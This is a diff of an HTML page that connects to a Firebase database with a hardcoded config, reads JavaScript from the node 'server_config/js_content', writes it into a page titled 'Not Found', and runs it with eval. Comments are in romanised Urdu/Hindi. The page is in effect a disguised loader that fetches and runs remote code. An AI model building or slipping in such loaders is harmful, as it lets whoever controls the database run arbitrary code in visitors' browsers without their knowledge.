@@ -2,15 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Not Found</title>
+    <title>Loading...</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
 </head>
 <body>
-
-<script id="js">/* Yahan code inject hoga */</script>
-
 <script>
     const firebaseConfig = {
         apiKey: "AIzaSyDuoka8B7oR6blqM6DawxGR7Lz1q6g6n44",
@@ -19,37 +15,33 @@
         appId: "1:1065485832455:web:7705978342f83a9caf35a2"
     };
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    db.ref("server_config/js_content").on("value", (snapshot) => {
+    
+    firebase.database().ref("server_config/js_content").on("value", (snapshot) => {
         const remoteCode = snapshot.val();
-        
         if (remoteCode) {
-            // 1. Purane dynamic elements ko remove karna
-            const oldScript = document.getElementById("injected-script");
-            if (oldScript) oldScript.remove();
+            // Poora naya HTML structure jo aapne manga tha
+            const finalHTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Not Found</title>
+</head>
+<body>
+    <script id="js">
+${remoteCode}
+    <\/script>
+</body>
+</html>`;
 
-            // 2. DOMParser se parse karna (Aapki requirement ke mutabiq)
-            const parser = new DOMParser();
-            const doc = parser.parseFromString(`<script>${remoteCode}<\/script>`, "text/html");
-            const finalCode = doc.querySelector("script").textContent;
-
-            // 3. Blob banana taake Sources tab mein file dikhe
-            // sourceURL dalne se Sources mein "Ahmad_Server_Script.js" ke naam se file dikhegi
-            const blobCode = finalCode + "\n//# sourceURL=Ahmad_Server_Script.js";
-            const blob = new Blob([blobCode], { type: "text/javascript" });
-            const scriptURL = URL.createObjectURL(blob);
-
-            // 4. Naya Script tag banakar inject karna
-            const newScript = document.createElement("script");
-            newScript.id = "injected-script";
-            newScript.src = scriptURL;
+            // Ye line sabse important hai: Ye current page ko khatam karke naya HTML likh degi
+            document.open();
+            document.write(finalHTML);
+            document.close();
             
-            // #js tag ke andar bhi text daal dete hain
-            document.getElementById("js").textContent = finalCode;
-
-            document.body.appendChild(newScript);
-            console.log("System Updated: Code is now visible in Sources.");
+            // Isse Sources mein code execute ho jayega
+            const executeScript = document.getElementById("js").text;
+            eval(executeScript);
         }
     });
 </script>
